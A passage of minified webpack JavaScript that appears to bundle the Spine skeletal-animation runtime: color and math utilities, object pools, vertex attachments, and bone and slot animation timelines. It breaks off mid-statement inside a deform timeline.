"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[3142],{786:function(t,e){var s;class i{constructor(){this.entries={},this.size=0}add(t){let e=this.entries[t];return this.entries[t]=!0,!e&&(this.size++,!0)}addAll(t){let e=this.size;for(var s=0,i=t.length;s<i;s++)this.add(t[s]);return e!=this.size}contains(t){return this.entries[t]}clear(){this.entries={},this.size=0}}class r{constructor(t=0,e=0,s=0,i=0){this.r=t,this.g=e,this.b=s,this.a=i}set(t,e,s,i){return this.r=t,this.g=e,this.b=s,this.a=i,this.clamp()}setFromColor(t){return this.r=t.r,this.g=t.g,this.b=t.b,this.a=t.a,this}setFromString(t){return t="#"==t.charAt(0)?t.substr(1):t,this.r=parseInt(t.substr(0,2),16)/255,this.g=parseInt(t.substr(2,2),16)/255,this.b=parseInt(t.substr(4,2),16)/255,this.a=8!=t.length?1:parseInt(t.substr(6,2),16)/255,this}add(t,e,s,i){return this.r+=t,this.g+=e,this.b+=s,this.a+=i,this.clamp()}clamp(){return this.r<0?this.r=0:this.r>1&&(this.r=1),this.g<0?this.g=0:this.g>1&&(this.g=1),this.b<0?this.b=0:this.b>1&&(this.b=1),this.a<0?this.a=0:this.a>1&&(this.a=1),this}static rgba8888ToColor(t,e){t.r=((4278190080&e)>>>24)/255,t.g=((16711680&e)>>>16)/255,t.b=((65280&e)>>>8)/255,t.a=(255&e)/255}static rgb888ToColor(t,e){t.r=((16711680&e)>>>16)/255,t.g=((65280&e)>>>8)/255,t.b=(255&e)/255}static fromString(t){return(new r).setFromString(t)}}r.WHITE=new r(1,1,1,1),r.RED=new r(1,0,0,1),r.GREEN=new r(0,1,0,1),r.BLUE=new r(0,0,1,1),r.MAGENTA=new r(1,0,1,1);class n{static clamp(t,e,s){return t<e?e:t>s?s:t}static cosDeg(t){return Math.cos(t*n.degRad)}static sinDeg(t){return Math.sin(t*n.degRad)}static signum(t){return t>0?1:t<0?-1:0}static toInt(t){return t>0?Math.floor(t):Math.ceil(t)}static cbrt(t){let e=Math.pow(Math.abs(t),1/3);return t<0?-e:e}static randomTriangular(t,e){return n.randomTriangularWith(t,e,.5*(t+e))}static randomTriangularWith(t,e,s){let i=Math.random(),r=e-t;return i<=(s-t)/r?t+Math.sqrt(i*r*(s-t)):e-Math.sqrt((1-i)*r*(e-s))}static isPowerOfTwo(t){return t&&0==(t&t-1)}}n.PI=3.1415927,n.PI2=2*n.PI,n.radiansToDegrees=180/n.PI,n.radDeg=n.radiansToDegrees,n.degreesToRadians=n.PI/180,n.degRad=n.degreesToRadians;class a{static arrayCopy(t,e,s,i,r){for(let n=e,a=i;n<e+r;n++,a++)s[a]=t[n]}static arrayFill(t,e,s,i){for(let r=e;r<s;r++)t[r]=i}static setArraySize(t,e,s=0){let i=t.length;if(i==e)return t;if(t.length=e,i<e)for(let r=i;r<e;r++)t[r]=s;return t}static ensureArrayCapacity(t,e,s=0){return t.length>=e?t:a.setArraySize(t,e,s)}static newArray(t,e){let s=new Array(t);for(let i=0;i<t;i++)s[i]=e;return s}static newFloatArray(t){if(a.SUPPORTS_TYPED_ARRAYS)return new Float32Array(t);{let e=new Array(t);for(let t=0;t<e.length;t++)e[t]=0;return e}}static newShortArray(t){if(a.SUPPORTS_TYPED_ARRAYS)return new Int16Array(t);{let e=new Array(t);for(let t=0;t<e.length;t++)e[t]=0;return e}}static toFloatArray(t){return a.SUPPORTS_TYPED_ARRAYS?new Float32Array(t):t}static toSinglePrecision(t){return a.SUPPORTS_TYPED_ARRAYS?Math.fround(t):t}static webkit602BugfixHelper(t,e){}static contains(t,e,s=!0){for(var i=0;i<t.length;i++)if(t[i]==e)return!0;return!1}static enumValue(t,e){return t[e[0].toUpperCase()+e.slice(1)]}}a.SUPPORTS_TYPED_ARRAYS="undefined"!=typeof Float32Array;class o{constructor(t){this.items=new Array,this.instantiator=t}obtain(){return this.items.length>0?this.items.pop():this.instantiator()}free(t){t.reset&&t.reset(),this.items.push(t)}freeAll(t){for(let e=0;e<t.length;e++)this.free(t[e])}clear(){this.items.length=0}}class l{constructor(t=0,e=0){this.x=t,this.y=e}set(t,e){return this.x=t,this.y=e,this}length(){let t=this.x,e=this.y;return Math.sqrt(t*t+e*e)}normalize(){let t=this.length();return 0!=t&&(this.x/=t,this.y/=t),this}}class h{constructor(t){if(!t)throw new Error("name cannot be null.");this.name=t}}class c extends h{constructor(t){super(t),this.id=c.nextID++,this.bones=null,this.vertices=[],this.worldVerticesLength=0,this.timelineAttahment=this}computeWorldVertices(t,e,s,i,r,n){s=r+(s>>1)*n;let a=t.bone.skeleton,o=t.deform,l=this.vertices,h=this.bones;if(!h){o.length>0&&(l=o);let a=t.bone,h=a.worldX,c=a.worldY,d=a.a,u=a.b,m=a.c,f=a.d;for(let t=e,a=r;a<s;t+=2,a+=n){let e=l[t],s=l[t+1];i[a]=e*d+s*u+h,i[a+1]=e*m+s*f+c}return}let c=0,d=0;for(let t=0;t<e;t+=2){let t=h[c];c+=t+1,d+=t}let u=a.bones;if(0==o.length)for(let t=r,e=3*d;t<s;t+=n){let s=0,r=0,n=h[c++];for(n+=c;c<n;c++,e+=3){let t=u[h[c]],i=l[e],n=l[e+1],a=l[e+2];s+=(i*t.a+n*t.b+t.worldX)*a,r+=(i*t.c+n*t.d+t.worldY)*a}i[t]=s,i[t+1]=r}else{let t=o;for(let e=r,a=3*d,o=d<<1;e<s;e+=n){let s=0,r=0,n=h[c++];for(n+=c;c<n;c++,a+=3,o+=2){let e=u[h[c]],i=l[a]+t[o],n=l[a+1]+t[o+1],d=l[a+2];s+=(i*e.a+n*e.b+e.worldX)*d,r+=(i*e.c+n*e.d+e.worldY)*d}i[e]=s,i[e+1]=r}}}copyTo(t){this.bones?(t.bones=new Array(this.bones.length),a.arrayCopy(this.bones,0,t.bones,0,this.bones.length)):t.bones=null,this.vertices&&(t.vertices=a.newFloatArray(this.vertices.length),a.arrayCopy(this.vertices,0,t.vertices,0,this.vertices.length)),t.worldVerticesLength=this.worldVerticesLength,t.timelineAttahment=this.timelineAttahment}}c.nextID=0;class d{constructor(t){this.id=d.nextID(),this.start=0,this.digits=0,this.setupIndex=0,this.regions=new Array(t)}copy(){let t=new d(this.regions.length);return a.arrayCopy(this.regions,0,t.regions,0,this.regions.length),t.start=this.start,t.digits=this.digits,t.setupIndex=this.setupIndex,t}apply(t,e){let s=t.sequenceIndex;-1==s&&(s=this.setupIndex),s>=this.regions.length&&(s=this.regions.length-1);let i=this.regions[s];e.region!=i&&(e.region=i,e.updateRegion())}getPath(t,e){let s=t,i=(this.start+e).toString();for(let t=this.digits-i.length;t>0;t--)s+="0";return s+=i,s}static nextID(){return d._nextID++}}d._nextID=0,function(t){t[t.hold=0]="hold",t[t.once=1]="once",t[t.loop=2]="loop",t[t.pingpong=3]="pingpong",t[t.onceReverse=4]="onceReverse",t[t.loopReverse=5]="loopReverse",t[t.pingpongReverse=6]="pingpongReverse"}(s||(s={}));const u=[s.hold,s.once,s.loop,s.pingpong,s.onceReverse,s.loopReverse,s.pingpongReverse];class m{constructor(t,e,s){if(this.timelines=[],this.timelineIds=new i,!t)throw new Error("name cannot be null.");this.name=t,this.setTimelines(e),this.duration=s}setTimelines(t){if(!t)throw new Error("timelines cannot be null.");this.timelines=t,this.timelineIds.clear();for(var e=0;e<t.length;e++)this.timelineIds.addAll(t[e].getPropertyIds())}hasTimeline(t){for(let e=0;e<t.length;e++)if(this.timelineIds.contains(t[e]))return!0;return!1}apply(t,e,s,i,r,n,a,o){if(!t)throw new Error("skeleton cannot be null.");i&&0!=this.duration&&(s%=this.duration,e>0&&(e%=this.duration));let l=this.timelines;for(let i=0,h=l.length;i<h;i++)l[i].apply(t,e,s,r,n,a,o)}}var f,g;e.bq=void 0,(f=e.bq||(e.bq={}))[f.setup=0]="setup",f[f.first=1]="first",f[f.replace=2]="replace",f[f.add=3]="add",e.mJ=void 0,(g=e.mJ||(e.mJ={}))[g.mixIn=0]="mixIn",g[g.mixOut=1]="mixOut";class p{constructor(t,e){this.propertyIds=e,this.frames=a.newFloatArray(t*this.getFrameEntries())}getPropertyIds(){return this.propertyIds}getFrameEntries(){return 1}getFrameCount(){return this.frames.length/this.getFrameEntries()}getDuration(){return this.frames[this.frames.length-this.getFrameEntries()]}static search1(t,e){let s=t.length;for(let i=1;i<s;i++)if(t[i]>e)return i-1;return s-1}static search(t,e,s){let i=t.length;for(let r=s;r<i;r+=s)if(t[r]>e)return r-s;return i-s}}class b extends p{constructor(t,e,s){super(t,s),this.curves=a.newFloatArray(t+18*e),this.curves[t-1]=1}setLinear(t){this.curves[t]=0}setStepped(t){this.curves[t]=1}shrink(t){let e=this.getFrameCount()+18*t;if(this.curves.length>e){let t=a.newFloatArray(e);a.arrayCopy(this.curves,0,t,0,e),this.curves=t}}setBezier(t,e,s,i,r,n,a,o,l,h,c){let d=this.curves,u=this.getFrameCount()+18*t;0==s&&(d[e]=2+u);let m=.03*(i-2*n+o),f=.03*(r-2*a+l),g=.006*(3*(n-o)-i+h),p=.006*(3*(a-l)-r+c),b=2*m+g,x=2*f+p,w=.3*(n-i)+m+.16666667*g,y=.3*(a-r)+f+.16666667*p,v=i+w,A=r+y;for(let t=u+18;u<t;u+=2)d[u]=v,d[u+1]=A,w+=b,y+=x,b+=g,x+=p,v+=w,A+=y}getBezierValue(t,e,s,i){let r=this.curves;if(r[i]>t){let n=this.frames[e],a=this.frames[e+s];return a+(t-n)/(r[i]-n)*(r[i+1]-a)}let n=i+18;for(i+=2;i<n;i+=2)if(r[i]>=t){let e=r[i-2],s=r[i-1];return s+(t-e)/(r[i]-e)*(r[i+1]-s)}e+=this.getFrameEntries();let a=r[n-2],o=r[n-1];return o+(t-a)/(this.frames[e]-a)*(this.frames[e+s]-o)}}class x extends b{constructor(t,e,s){super(t,e,[s])}getFrameEntries(){return 2}setFrame(t,e,s){t<<=1,this.frames[t]=e,this.frames[t+1]=s}getCurveValue(t){let e=this.frames,s=e.length-2;for(let i=2;i<=s;i+=2)if(e[i]>t){s=i-2;break}let i=this.curves[s>>1];switch(i){case 0:let i=e[s],r=e[s+1];return r+(t-i)/(e[s+2]-i)*(e[s+2+1]-r);case 1:return e[s+1]}return this.getBezierValue(t,s,1,i-2)}}class w extends b{constructor(t,e,s,i){super(t,e,[s,i])}getFrameEntries(){return 3}setFrame(t,e,s,i){t*=3,this.frames[t]=e,this.frames[t+1]=s,this.frames[t+2]=i}}class y extends x{constructor(t,e,s){super(t,e,"0|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.rotation=l.data.rotation);case e.bq.first:l.rotation+=(l.data.rotation-l.rotation)*n}return}let h=this.getCurveValue(i);switch(a){case e.bq.setup:l.rotation=l.data.rotation+h*n;break;case e.bq.first:case e.bq.replace:h+=l.data.rotation-l.rotation;case e.bq.add:l.rotation+=h*n}}}class v extends w{constructor(t,e,s){super(t,e,"1|"+s,"2|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;let h=this.frames;if(i<h[0]){switch(a){case e.bq.setup:return l.x=l.data.x,void(l.y=l.data.y);case e.bq.first:l.x+=(l.data.x-l.x)*n,l.y+=(l.data.y-l.y)*n}return}let c=0,d=0,u=p.search(h,i,3),m=this.curves[u/3];switch(m){case 0:let t=h[u];c=h[u+1],d=h[u+2];let e=(i-t)/(h[u+3]-t);c+=(h[u+3+1]-c)*e,d+=(h[u+3+2]-d)*e;break;case 1:c=h[u+1],d=h[u+2];break;default:c=this.getBezierValue(i,u,1,m-2),d=this.getBezierValue(i,u,2,m+18-2)}switch(a){case e.bq.setup:l.x=l.data.x+c*n,l.y=l.data.y+d*n;break;case e.bq.first:case e.bq.replace:l.x+=(l.data.x+c-l.x)*n,l.y+=(l.data.y+d-l.y)*n;break;case e.bq.add:l.x+=c*n,l.y+=d*n}}}class A extends x{constructor(t,e,s){super(t,e,"1|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.x=l.data.x);case e.bq.first:l.x+=(l.data.x-l.x)*n}return}let h=this.getCurveValue(i);switch(a){case e.bq.setup:l.x=l.data.x+h*n;break;case e.bq.first:case e.bq.replace:l.x+=(l.data.x+h-l.x)*n;break;case e.bq.add:l.x+=h*n}}}class C extends x{constructor(t,e,s){super(t,e,"2|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.y=l.data.y);case e.bq.first:l.y+=(l.data.y-l.y)*n}return}let h=this.getCurveValue(i);switch(a){case e.bq.setup:l.y=l.data.y+h*n;break;case e.bq.first:case e.bq.replace:l.y+=(l.data.y+h-l.y)*n;break;case e.bq.add:l.y+=h*n}}}class S extends w{constructor(t,e,s){super(t,e,"3|"+s,"4|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,a,o,l){let h=t.bones[this.boneIndex];if(!h.active)return;let c,d,u=this.frames;if(i<u[0]){switch(o){case e.bq.setup:return h.scaleX=h.data.scaleX,void(h.scaleY=h.data.scaleY);case e.bq.first:h.scaleX+=(h.data.scaleX-h.scaleX)*a,h.scaleY+=(h.data.scaleY-h.scaleY)*a}return}let m=p.search(u,i,3),f=this.curves[m/3];switch(f){case 0:let t=u[m];c=u[m+1],d=u[m+2];let e=(i-t)/(u[m+3]-t);c+=(u[m+3+1]-c)*e,d+=(u[m+3+2]-d)*e;break;case 1:c=u[m+1],d=u[m+2];break;default:c=this.getBezierValue(i,m,1,f-2),d=this.getBezierValue(i,m,2,f+18-2)}if(c*=h.data.scaleX,d*=h.data.scaleY,1==a)o==e.bq.add?(h.scaleX+=c-h.data.scaleX,h.scaleY+=d-h.data.scaleY):(h.scaleX=c,h.scaleY=d);else{let t=0,s=0;if(l==e.mJ.mixOut)switch(o){case e.bq.setup:t=h.data.scaleX,s=h.data.scaleY,h.scaleX=t+(Math.abs(c)*n.signum(t)-t)*a,h.scaleY=s+(Math.abs(d)*n.signum(s)-s)*a;break;case e.bq.first:case e.bq.replace:t=h.scaleX,s=h.scaleY,h.scaleX=t+(Math.abs(c)*n.signum(t)-t)*a,h.scaleY=s+(Math.abs(d)*n.signum(s)-s)*a;break;case e.bq.add:h.scaleX+=(c-h.data.scaleX)*a,h.scaleY+=(d-h.data.scaleY)*a}else switch(o){case e.bq.setup:t=Math.abs(h.data.scaleX)*n.signum(c),s=Math.abs(h.data.scaleY)*n.signum(d),h.scaleX=t+(c-t)*a,h.scaleY=s+(d-s)*a;break;case e.bq.first:case e.bq.replace:t=Math.abs(h.scaleX)*n.signum(c),s=Math.abs(h.scaleY)*n.signum(d),h.scaleX=t+(c-t)*a,h.scaleY=s+(d-s)*a;break;case e.bq.add:h.scaleX+=(c-h.data.scaleX)*a,h.scaleY+=(d-h.data.scaleY)*a}}}}class k extends x{constructor(t,e,s){super(t,e,"3|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,a,o,l){let h=t.bones[this.boneIndex];if(!h.active)return;if(i<this.frames[0]){switch(o){case e.bq.setup:return void(h.scaleX=h.data.scaleX);case e.bq.first:h.scaleX+=(h.data.scaleX-h.scaleX)*a}return}let c=this.getCurveValue(i)*h.data.scaleX;if(1==a)o==e.bq.add?h.scaleX+=c-h.data.scaleX:h.scaleX=c;else{let t=0;if(l==e.mJ.mixOut)switch(o){case e.bq.setup:t=h.data.scaleX,h.scaleX=t+(Math.abs(c)*n.signum(t)-t)*a;break;case e.bq.first:case e.bq.replace:t=h.scaleX,h.scaleX=t+(Math.abs(c)*n.signum(t)-t)*a;break;case e.bq.add:h.scaleX+=(c-h.data.scaleX)*a}else switch(o){case e.bq.setup:t=Math.abs(h.data.scaleX)*n.signum(c),h.scaleX=t+(c-t)*a;break;case e.bq.first:case e.bq.replace:t=Math.abs(h.scaleX)*n.signum(c),h.scaleX=t+(c-t)*a;break;case e.bq.add:h.scaleX+=(c-h.data.scaleX)*a}}}}class E extends x{constructor(t,e,s){super(t,e,"4|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,a,o,l){let h=t.bones[this.boneIndex];if(!h.active)return;if(i<this.frames[0]){switch(o){case e.bq.setup:return void(h.scaleY=h.data.scaleY);case e.bq.first:h.scaleY+=(h.data.scaleY-h.scaleY)*a}return}let c=this.getCurveValue(i)*h.data.scaleY;if(1==a)o==e.bq.add?h.scaleY+=c-h.data.scaleY:h.scaleY=c;else{let t=0;if(l==e.mJ.mixOut)switch(o){case e.bq.setup:t=h.data.scaleY,h.scaleY=t+(Math.abs(c)*n.signum(t)-t)*a;break;case e.bq.first:case e.bq.replace:t=h.scaleY,h.scaleY=t+(Math.abs(c)*n.signum(t)-t)*a;break;case e.bq.add:h.scaleY+=(c-h.data.scaleY)*a}else switch(o){case e.bq.setup:t=Math.abs(h.data.scaleY)*n.signum(c),h.scaleY=t+(c-t)*a;break;case e.bq.first:case e.bq.replace:t=Math.abs(h.scaleY)*n.signum(c),h.scaleY=t+(c-t)*a;break;case e.bq.add:h.scaleY+=(c-h.data.scaleY)*a}}}}class Y extends w{constructor(t,e,s){super(t,e,"5|"+s,"6|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;let h=this.frames;if(i<h[0]){switch(a){case e.bq.setup:return l.shearX=l.data.shearX,void(l.shearY=l.data.shearY);case e.bq.first:l.shearX+=(l.data.shearX-l.shearX)*n,l.shearY+=(l.data.shearY-l.shearY)*n}return}let c=0,d=0,u=p.search(h,i,3),m=this.curves[u/3];switch(m){case 0:let t=h[u];c=h[u+1],d=h[u+2];let e=(i-t)/(h[u+3]-t);c+=(h[u+3+1]-c)*e,d+=(h[u+3+2]-d)*e;break;case 1:c=h[u+1],d=h[u+2];break;default:c=this.getBezierValue(i,u,1,m-2),d=this.getBezierValue(i,u,2,m+18-2)}switch(a){case e.bq.setup:l.shearX=l.data.shearX+c*n,l.shearY=l.data.shearY+d*n;break;case e.bq.first:case e.bq.replace:l.shearX+=(l.data.shearX+c-l.shearX)*n,l.shearY+=(l.data.shearY+d-l.shearY)*n;break;case e.bq.add:l.shearX+=c*n,l.shearY+=d*n}}}class M extends x{constructor(t,e,s){super(t,e,"5|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.shearX=l.data.shearX);case e.bq.first:l.shearX+=(l.data.shearX-l.shearX)*n}return}let h=this.getCurveValue(i);switch(a){case e.bq.setup:l.shearX=l.data.shearX+h*n;break;case e.bq.first:case e.bq.replace:l.shearX+=(l.data.shearX+h-l.shearX)*n;break;case e.bq.add:l.shearX+=h*n}}}class T extends x{constructor(t,e,s){super(t,e,"6|"+s),this.boneIndex=0,this.boneIndex=s}apply(t,s,i,r,n,a,o){let l=t.bones[this.boneIndex];if(!l.active)return;if(i<this.frames[0]){switch(a){case e.bq.setup:return void(l.shearY=l.data.shearY);case e.bq.first:l.shearY+=(l.data.shearY-l.shearY)*n}return}let h=this.getCurveValue(i);switch(a){case e.bq.setup:l.shearY=l.data.shearY+h*n;break;case e.bq.first:case e.bq.replace:l.shearY+=(l.data.shearY+h-l.shearY)*n;break;case e.bq.add:l.shearY+=h*n}}}class I extends b{constructor(t,e,s){super(t,e,["7|"+s,"8|"+s]),this.slotIndex=0,this.slotIndex=s}getFrameEntries(){return 5}setFrame(t,e,s,i,r,n){t*=5,this.frames[t]=e,this.frames[t+1]=s,this.frames[t+2]=i,this.frames[t+3]=r,this.frames[t+4]=n}apply(t,s,i,r,n,a,o){let l=t.slots[this.slotIndex];if(!l.bone.active)return;let h=this.frames,c=l.color;if(i<h[0]){let t=l.data.color;switch(a){case e.bq.setup:return void c.setFromColor(t);case e.bq.first:c.add((t.r-c.r)*n,(t.g-c.g)*n,(t.b-c.b)*n,(t.a-c.a)*n)}return}let d=0,u=0,m=0,f=0,g=p.search(h,i,5),b=this.curves[g/5];switch(b){case 0:let t=h[g];d=h[g+1],u=h[g+2],m=h[g+3],f=h[g+4];let e=(i-t)/(h[g+5]-t);d+=(h[g+5+1]-d)*e,u+=(h[g+5+2]-u)*e,m+=(h[g+5+3]-m)*e,f+=(h[g+5+4]-f)*e;break;case 1:d=h[g+1],u=h[g+2],m=h[g+3],f=h[g+4];break;default:d=this.getBezierValue(i,g,1,b-2),u=this.getBezierValue(i,g,2,b+18-2),m=this.getBezierValue(i,g,3,b+36-2),f=this.getBezierValue(i,g,4,b+54-2)}1==n?c.set(d,u,m,f):(a==e.bq.setup&&c.setFromColor(l.data.color),c.add((d-c.r)*n,(u-c.g)*n,(m-c.b)*n,(f-c.a)*n))}}class X extends b{constructor(t,e,s){super(t,e,["7|"+s]),this.slotIndex=0,this.slotIndex=s}getFrameEntries(){return 4}setFrame(t,e,s,i,r){t<<=2,this.frames[t]=e,this.frames[t+1]=s,this.frames[t+2]=i,this.frames[t+3]=r}apply(t,s,i,r,n,a,o){let l=t.slots[this.slotIndex];if(!l.bone.active)return;let h=this.frames,c=l.color;if(i<h[0]){let t=l.data.color;switch(a){case e.bq.setup:return c.r=t.r,c.g=t.g,void(c.b=t.b);case e.bq.first:c.r+=(t.r-c.r)*n,c.g+=(t.g-c.g)*n,c.b+=(t.b-c.b)*n}return}let d=0,u=0,m=0,f=p.search(h,i,4),g=this.curves[f>>2];switch(g){case 0:let t=h[f];d=h[f+1],u=h[f+2],m=h[f+3];let e=(i-t)/(h[f+4]-t);d+=(h[f+4+1]-d)*e,u+=(h[f+4+2]-u)*e,m+=(h[f+4+3]-m)*e;break;case 1:d=h[f+1],u=h[f+2],m=h[f+3];break;default:d=this.getBezierValue(i,f,1,g-2),u=this.getBezierValue(i,f,2,g+18-2),m=this.getBezierValue(i,f,3,g+36-2)}if(1==n)c.r=d,c.g=u,c.b=m;else{if(a==e.bq.setup){let t=l.data.color;c.r=t.r,c.g=t.g,c.b=t.b}c.r+=(d-c.r)*n,c.g+=(u-c.g)*n,c.b+=(m-c.b)*n}}}class R extends x{constructor(t,e,s){super(t,e,"8|"+s),this.slotIndex=0,this.slotIndex=s}apply(t,s,i,r,n,a,o){let l=t.slots[this.slotIndex];if(!l.bone.active)return;let h=l.color;if(i<this.frames[0]){let t=l.data.color;switch(a){case e.bq.setup:return void(h.a=t.a);case e.bq.first:h.a+=(t.a-h.a)*n}return}let c=this.getCurveValue(i);1==n?h.a=c:(a==e.bq.setup&&(h.a=l.data.color.a),h.a+=(c-h.a)*n)}}class L extends b{constructor(t,e,s){super(t,e,["7|"+s,"8|"+s,"9|"+s]),this.slotIndex=0,this.slotIndex=s}getFrameEntries(){return 8}setFrame(t,e,s,i,r,n,a,o,l){t<<=3,this.frames[t]=e,this.frames[t+1]=s,this.frames[t+2]=i,this.frames[t+3]=r,this.frames[t+4]=n,this.frames[t+5]=a,this.frames[t+6]=o,this.frames[t+7]=l}apply(t,s,i,r,n,a,o){let l=t.slots[this.slotIndex];if(!l.bone.active)return;let h=this.frames,c=l.color,d=l.darkColor;if(i<h[0]){let t=l.data.color,s=l.data.darkColor;switch(a){case e.bq.setup:return c.setFromColor(t),d.r=s.r,d.g=s.g,void(d.b=s.b);case e.bq.first:c.add((t.r-c.r)*n,(t.g-c.g)*n,(t.b-c.b)*n,(t.a-c.a)*n),d.r+=(s.r-d.r)*n,d.g+=(s.g-d.g)*n,d.b+=(s.b-d.b)*n}return}let u=0,m=0,f=0,g=0,b=0,x=0,w=0,y=p.search(h,i,8),v=this.curves[y>>3];switch(v){case 0:let t=h[y];u=h[y+1],m=h[y+2],f=h[y+3],g=h[y+4],b=h[y+5],x=h[y+6],w=h[y+7];let e=(i-t)/(h[y+8]-t);u+=(h[y+8+1]-u)*e,m+=(h[y+8+2]-m)*e,f+=(h[y+8+3]-f)*e,g+=(h[y+8+4]-g)*e,b+=(h[y+8+5]-b)*e,x+=(h[y+8+6]-x)*e,w+=(h[y+8+7]-w)*e;break;case 1:u=h[y+1],m=h[y+2],f=h[y+3],g=h[y+4],b=h[y+5],x=h[y+6],w=h[y+7];break;default:u=this.getBezierValue(i,y,1,v-2),m=this.getBezierValue(i,y,2,v+18-2),f=this.getBezierValue(i,y,3,v+36-2),g=this.getBezierValue(i,y,4,v+54-2),b=this.getBezierValue(i,y,5,v+72-2),x=this.getBezierValue(i,y,6,v+90-2),w=this.getBezierValue(i,y,7,v+108-2)}if(1==n)c.set(u,m,f,g),d.r=b,d.g=x,d.b=w;else{if(a==e.bq.setup){c.setFromColor(l.data.color);let t=l.data.darkColor;d.r=t.r,d.g=t.g,d.b=t.b}c.add((u-c.r)*n,(m-c.g)*n,(f-c.b)*n,(g-c.a)*n),d.r+=(b-d.r)*n,d.g+=(x-d.g)*n,d.b+=(w-d.b)*n}}}class P extends b{constructor(t,e,s){super(t,e,["7|"+s,"9|"+s]),this.slotIndex=0,this.slotIndex=s}getFrameEntries(){return 7}setFrame(t,e,s,i,r,n,a,o){t*=7,this.frames[t]=e,this.frames[t+1]=s,this.frames[t+2]=i,this.frames[t+3]=r,this.frames[t+4]=n,this.frames[t+5]=a,this.frames[t+6]=o}apply(t,s,i,r,n,a,o){let l=t.slots[this.slotIndex];if(!l.bone.active)return;let h=this.frames,c=l.color,d=l.darkColor;if(i<h[0]){let t=l.data.color,s=l.data.darkColor;switch(a){case e.bq.setup:return c.r=t.r,c.g=t.g,c.b=t.b,d.r=s.r,d.g=s.g,void(d.b=s.b);case e.bq.first:c.r+=(t.r-c.r)*n,c.g+=(t.g-c.g)*n,c.b+=(t.b-c.b)*n,d.r+=(s.r-d.r)*n,d.g+=(s.g-d.g)*n,d.b+=(s.b-d.b)*n}return}let u=0,m=0,f=0,g=0,b=0,x=0,w=p.search(h,i,7),y=this.curves[w/7];switch(y){case 0:let t=h[w];u=h[w+1],m=h[w+2],f=h[w+3],g=h[w+4],b=h[w+5],x=h[w+6];let e=(i-t)/(h[w+7]-t);u+=(h[w+7+1]-u)*e,m+=(h[w+7+2]-m)*e,f+=(h[w+7+3]-f)*e,g+=(h[w+7+4]-g)*e,b+=(h[w+7+5]-b)*e,x+=(h[w+7+6]-x)*e;break;case 1:u=h[w+1],m=h[w+2],f=h[w+3],g=h[w+4],b=h[w+5],x=h[w+6];break;default:u=this.getBezierValue(i,w,1,y-2),m=this.getBezierValue(i,w,2,y+18-2),f=this.getBezierValue(i,w,3,y+36-2),g=this.getBezierValue(i,w,4,y+54-2),b=this.getBezierValue(i,w,5,y+72-2),x=this.getBezierValue(i,w,6,y+90-2)}if(1==n)c.r=u,c.g=m,c.b=f,d.r=g,d.g=b,d.b=x;else{if(a==e.bq.setup){let t=l.data.color,e=l.data.darkColor;c.r=t.r,c.g=t.g,c.b=t.b,d.r=e.r,d.g=e.g,d.b=e.b}c.r+=(u-c.r)*n,c.g+=(m-c.g)*n,c.b+=(f-c.b)*n,d.r+=(g-d.r)*n,d.g+=(b-d.g)*n,d.b+=(x-d.b)*n}}}class q extends p{constructor(t,e){super(t,["10|"+e]),this.slotIndex=0,this.slotIndex=e,this.attachmentNames=new Array(t)}getFrameCount(){return this.frames.length}setFrame(t,e,s){this.frames[t]=e,this.attachmentNames[t]=s}apply(t,s,i,r,n,a,o){let l=t.slots[this.slotIndex];l.bone.active&&(o!=e.mJ.mixOut?i<this.frames[0]?a!=e.bq.setup&&a!=e.bq.first||this.setAttachment(t,l,l.data.attachmentName):this.setAttachment(t,l,this.attachmentNames[p.search1(this.frames,i)]):a==e.bq.setup&&this.setAttachment(t,l,l.data.attachmentName))}setAttachment(t,e,s){e.setAttachment(s?t.getAttachment(this.slotIndex,s):null)}}class F extends b{constructor(t,e,s,i){super(t,e,["11|"+s+"|"+i.id]),this.slotIndex=0,this.slotIndex=s,this.attachment=i,this.vertices=new Array(t)}getFrameCount(){return this.frames.length}setFrame(t,e,s){this.frames[t]=e,this.vertices[t]=s}setBezier(t,e,s,i,r,n,a,o,l,h,c){let d=this.curves,u=this.getFrameCount()+18*t;0==s&&(d[e]=2+u);let m=.03*(i-2*n+o),f=.03*l-.06*a,g=.006*(3*(n-o)-i+h),p=.018*(a-l+.33333333),b=2*m+g,x=2*f+p,w=.3*(n-i)+m+.16666667*g,y=.3*a+f+.16666667*p,v=i+w,A=y;for(let t=u+18;u<t;u+=2)d[u]=v,d[u+1]=A,w+=b,y+=x,b+=g,x+=p,v+=w,A+=y}getCurvePercent(t,e){let s=this.curves,i=s[e];switch(i){case 0:let s=this.frames[e];return(t-s)/(this.frames[e+this.getFrameEntries()]-s);case 1:return 0}if(i-=2,s[i]>t){let r=this.frames[e];return s[i+1]*(t-r)/(s[i]-r)}let r=i+18;for(i+=2;i<r;i+=2)if(s[i]>=t){let e=s[i-2],r=s[i-1];return r+(t-e)/(s[i]-e)*(s[i+1]-r)}let n=s[r-2],a=s[r-1];return a+(1-a)*(t-n)/(this.frames[e+this.getFrameEntries()]-n)}apply(t,s,i,r,n,o,l){let h=t.slots[this.slotIndex];if(!h.bone.active)return;let d=h.getAttachment();if(!d)return;if(!(d instanceof c)||d.timelineAttahment!=this.attachment)return;let u=h.deform;0==u.length&&(o=e.bq.setup);let m=this.vertices,f=m[0].length,g=this.frames;if(i<g[0]){switch(o){case e.bq.setup:return void(u.length=0);case e.bq.first:if(1==n)return void(u.length=0);u.length=f;let 